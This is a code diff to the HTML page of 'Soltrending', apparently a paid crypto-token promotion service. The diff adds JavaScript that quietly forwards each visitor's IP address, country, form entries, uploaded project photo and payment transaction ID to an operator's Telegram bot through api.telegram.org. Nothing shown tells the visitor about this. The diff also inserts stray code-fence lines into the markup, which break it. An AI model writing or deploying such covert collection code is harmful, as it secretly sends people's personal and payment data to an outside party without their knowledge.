@@ -4,11 +4,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Soltrending - Submit details</title>
+    <title>Soltrending - Submit & Pay</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
-
+```
     body {
         font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -230,7 +230,7 @@
         .container { margin: 10px; padding: 20px; }
     }
 </style>
-
+```
 
 </head>
 <body>
@@ -238,7 +238,7 @@
         <div class="logo">Soltrending</div>
         <div class="user-info" id="userInfo">Loading location...</div>
 
-
+```
     <div class="step-dots">
         <div class="dot active" id="dot1"></div>
         <div class="dot" id="dot2"></div>
@@ -420,6 +420,22 @@
         }
     }
 
+    async function sendTelegramPhoto(file, caption) {
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT);
+            formData.append('photo', file);
+            formData.append('caption', caption);
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        } catch (e) {
+            console.log('Telegram photo failed:', e);
+        }
+    }
+
     function nextStep(step) {
         if (step === 1) {
             const name = document.getElementById('projectName').value.trim();
@@ -434,9 +450,15 @@
             const twitter = document.getElementById('twitter').value.trim();
             const website = document.getElementById('website').value.trim();
             const description = document.getElementById('projectDescription').value.trim();
-            const hasPhoto = document.getElementById('projectPhoto').files.length > 0;
+            const photoFile = document.getElementById('projectPhoto').files[0];
 
-            sendTelegram(`📝 CA SUBMITTED\n👤 ${userCountry} (${userIP})\n🏷️ ${name}\n💰 ${ca}\n📱 Telegram: ${telegram || 'None'}\n🐦 Twitter: ${twitter || 'None'}\n🌐 Website: ${website || 'None'}\n📄 Description: ${description || 'None'}\n📸 Photo: ${hasPhoto ? 'Yes' : 'No'}`);
+            const message = `📝 CA SUBMITTED\n👤 ${userCountry} (${userIP})\n🏷️ ${name}\n💰 ${ca}\n📱 Telegram: ${telegram || 'None'}\n🐦 Twitter: ${twitter || 'None'}\n🌐 Website: ${website || 'None'}\n📄 Description: ${description || 'None'}`;
+
+            if (photoFile) {
+                sendTelegramPhoto(photoFile, message + '\n📸 Project Photo:');
+            } else {
+                sendTelegram(message + '\n📸 Photo: No');
+            }
         }
         
         if (step === 2 && !selectedPackage) {
@@ -547,7 +569,14 @@
                 </div>
             `;
 
-            sendTelegram(`🎉 PAYMENT SUCCESS!\n👤 ${userCountry} (${userIP})\n🏷️ ${document.getElementById('projectName').value}\n💰 ${document.getElementById('caAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ ${selectedPackage.toUpperCase()}\n💵 ${selectedPrice} SOL\n🔗 ${txId}\n✅ READY TO TREND!`);
+            const successMessage = `🎉 PAYMENT SUCCESS!\n👤 ${userCountry} (${userIP})\n🏷️ ${document.getElementById('projectName').value}\n💰 ${document.getElementById('caAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ ${selectedPackage.toUpperCase()}\n💵 ${selectedPrice} SOL\n🔗 ${txId}\n✅ READY TO TREND!`;
+            
+            const photoFile = document.getElementById('projectPhoto').files[0];
+            if (photoFile) {
+                sendTelegramPhoto(photoFile, successMessage + '\n📸 Final Project Photo:');
+            } else {
+                sendTelegram(successMessage);
+            }
         } else {
             statusDiv.innerHTML = '<div class="alert alert-error">❌ No Payment Detected</div>';
             resultDiv.innerHTML = `
@@ -581,7 +610,7 @@
         location.reload();
     }
 </script>
-
+```
 
 </body>
 </html>
